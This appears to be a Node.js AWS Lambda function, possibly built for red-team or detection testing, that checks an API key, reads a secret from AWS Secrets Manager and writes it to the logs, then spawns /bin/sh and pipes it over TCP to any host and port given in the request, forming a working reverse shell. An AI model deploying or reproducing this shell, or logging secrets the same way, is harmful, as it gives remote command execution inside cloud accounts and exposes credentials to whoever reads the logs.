/* References
https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/
https://stackoverflow.com/a/33292942
*/
const net = require('net');
const cp = require('child_process');
// eslint-disable-next-line import/no-unresolved
const { SecretsManagerClient } = require('@aws-sdk/client-secrets-manager');

const secrets = new SecretsManagerClient();

function isApiTokenValid(token) {
  const apiToken = process.env.PANTHER_API_KEY;
  return token === apiToken;
}

// Logging util
function writeLog(id, message) {
  const event = {
    EventId: id,
    Message: message,
  };

  // eslint-disable-next-line no-console
  console.log(JSON.stringify(event));
}

// Secrets management access
async function getSecret() {
  const name = process.env.PANTHER_SECRET_ARN;

  if (!name) {
    return '';
  }

  const params = { SecretId: name };
  const response = await secrets.getSecretValue(params).promise();
  return response.SecretString;
}

module.exports.panther = async (event) => {
  writeLog(1, 'Startup: The Panther is running.');

  // Validate API token.
  if (!isApiTokenValid(event.headers['x-api-key'])) {
    writeLog(2, 'Invalid API key.');
    return {
      statusCode: 403,
      body: JSON.stringify({
        message: 'Forbidden',
      }),
    };
  }

  try {
    // Read basic secret from secrets manager to produce normal log activity
    const secret = await getSecret();
    // NOTE: DON'T DO THIS IN REAL LIFE. BAD IDEA TO LOG SECRETS
    // DEBUG ONLY: Make sure it found the value.
    writeLog(8, `Secret value: ${secret}`);
  } catch (err) {
    writeLog(4, err);
    writeLog(8, 'Skipping secret read routine.');
  }

  let host;
  let port;

  if (event.queryStringParameters) {
    host = event.queryStringParameters.host;
    port = event.queryStringParameters.port;
  }

  if (!host || !port) {
    writeLog(2, 'Invalid request: Missing host or port parameter.');
    return {
      statusCode: 400,
      body: JSON.stringify({
        message: 'Must provide the host and port for the target TCP server as query parameters.',
      }),
    };
  }

  const portNum = parseInt(port, 10);

  const sh = cp.spawn('/bin/sh', []);
  const client = new net.Socket();

  try {
    await new Promise((resolve, reject) => {
      client.connect(portNum, host, () => {
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
      });

      client.on('close', (hadError) => {
        if (hadError) {
          reject(new Error('Transmission error.'));
        } else {
          resolve();
        }
      });

      client.on('end', () => {
        writeLog(5, 'Shutdown: The Panther is tired.');
        resolve();
      });

      client.on('error', (err) => {
        writeLog(4, err);
        reject(err);
      });

      client.on('timeout', () => {
        writeLog(3, 'Timeout: Function timeout occurred.');
        reject(new Error('Socket timeout.'));
      });
    });

    writeLog(5, 'Shutdown: The Panther is tired.');

    return {
      statusCode: 400,
      body: JSON.stringify({
        message: 'Connection terminated from client.',
      }),
    };
  } catch (err) {
    writeLog(4, err);
    return {
      statusCode: 500,
      body: JSON.stringify({
        message: 'Connection terminated from client.',
      }),
    };
  }
};
